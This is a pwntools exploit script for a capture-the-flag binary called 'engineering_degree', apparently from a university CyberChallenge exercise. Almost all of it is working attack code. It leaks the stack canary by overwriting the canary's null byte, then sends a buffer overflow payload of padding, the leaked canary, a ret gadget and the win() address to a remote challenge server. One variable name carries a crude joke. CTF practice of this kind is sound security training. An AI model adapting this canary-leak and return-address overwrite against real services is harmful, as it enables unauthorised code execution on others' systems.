'''
we have to exploit the degree() function in a way that bring us to the win() function
taking in account the stack canary
'''

''' CHECKSEC results:
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
'''
'''stack situation:
    return address
    backed ebp
    8 canary's byte
    40 data bytes
'''

from pwn import *

DEBUG = 0

context.binary = exe = ELF("./engineering_degree")
context.terminal = ['tmux', 'splitw', '-v']
context.gdb_binary = 'pwndbg'
if DEBUG == 1:
    context.log_level = "debug"
win = exe.symbols["win"]

rop = ROP(exe)
ret = rop.find_gadget(["ret"])[0]    #retrieves a ret gadjet address

'''
    p = process("./engineering_degree")
    gdb.attach(p, gdbscript=#
    break degree
    break win
    continue
    #)
'''
# it is like the previous versione but all together, removing the race condition
if DEBUG == 1 :
    p = gdb.debug("./engineering_degree", gdbscript='''
    break degree
    break win
    continue
    ''')
else :
    #p = process("./engineering_degree")
    p = remote("cyberchallenge.diag.uniroma1.it", "5145")
#print(win)

data_padding = b'D'*40
rbp_padding = b'B'*8

payload = data_padding
payload += b'G'   #needed for canceling the canary's null byte 

print(p.recvline())    #p.recvline() receives bytes, it is the print that makes it looks like strings
p.send(payload)
p.recvuntil(b">")
canarygay= p.recvline()
canary = u64(b"\x00" + canarygay[45:52])
print(canary)

#print(p.recvline())
new_paylaod = data_padding
new_paylaod += p64(canary)
new_paylaod += rbp_padding
new_paylaod += p64(ret)
new_paylaod += p64(win)

p.recvuntil(b">")
p.sendline(new_paylaod)

while(True):
    print(p.recvline())

#second_payload=
